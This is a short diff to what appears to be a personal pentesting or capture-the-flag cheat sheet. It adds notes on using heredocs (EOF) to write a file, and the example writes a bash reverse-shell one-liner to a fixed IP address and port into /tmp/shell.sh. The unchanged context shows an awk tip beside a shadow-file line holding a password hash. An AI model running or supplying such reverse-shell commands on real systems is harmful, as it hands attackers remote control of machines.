@@ -1,3 +1,22 @@
+Using EOF
+----------
+> Without EOF, to make the script line by line
+
+```
+echo '#!/bin/bash' > /tmp/shell.sh
+echo 'bash -i >& /dev/tcp/10.4.73.176/1111 0>&1' >> /tmp/shell.sh
+
+```
+> With EOF
+
+```
+cat > /tmp/shell.sh << EOF
+#!/bin/bash
+bash -i >& /dev/tcp/10.4.73.176/1111 0>&1
+EOF
+```
+
+
 Using awk to cut from :
 ------------------------
 GHOST:$y$j9T$1GDOKHFNKsfdsdfsfsYTdK1/ctM/$TphDQPwmQAovPbKgqGmnUxKmfl3vgeyUGAtdfssfsdtfSpiq0:19945:0:99999:7:::
